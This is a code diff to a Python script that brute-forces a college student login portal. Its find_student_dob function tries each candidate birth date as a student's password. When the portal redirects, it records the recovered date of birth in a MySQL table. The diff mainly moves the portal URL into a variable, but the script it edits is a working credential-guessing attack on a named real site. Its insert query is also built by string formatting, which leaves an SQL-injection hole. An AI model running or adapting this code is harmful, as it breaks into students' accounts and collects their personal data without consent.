@@ -9,6 +9,8 @@ mysql_cursor.execute('USE kcg')
 
 query_create_table = 'CREATE TABLE dobs(id varchar(13) primary key, dob varchar(8) not null)'
 
+student_login_url = 'http://studentlogin.kcgcollege.ac.in/'
+
 try:
     mysql_cursor.execute(query_create_table)
 except:
@@ -90,17 +92,17 @@ def find_student_dob(user_id, year_of_birth = None):
                     payload['txtpassword'] = The_day
                 
                     try:
-                        page = requests.post('http://studentlogin.kcgcollege.ac.in/', data = payload, timeout = 5 )
+                        page = requests.post(student_login_url, data = payload, timeout = 5 )
                         #print(The_day)
                     except:                   
                         continue
                 
-                    if page.url != 'http://studentlogin.kcgcollege.ac.in/': 
+                    if page.url != student_login_url: 
                         mysql_cursor.execute("INSERT INTO dobs VALUES('{}','{}')".format(user_id,The_day))
                         mysql_cursor.execute('commit')
                         #print(The_day)               
                         return The_day
-                
+    raise Exception       
 #find_dob('20cs023')                        
             
 
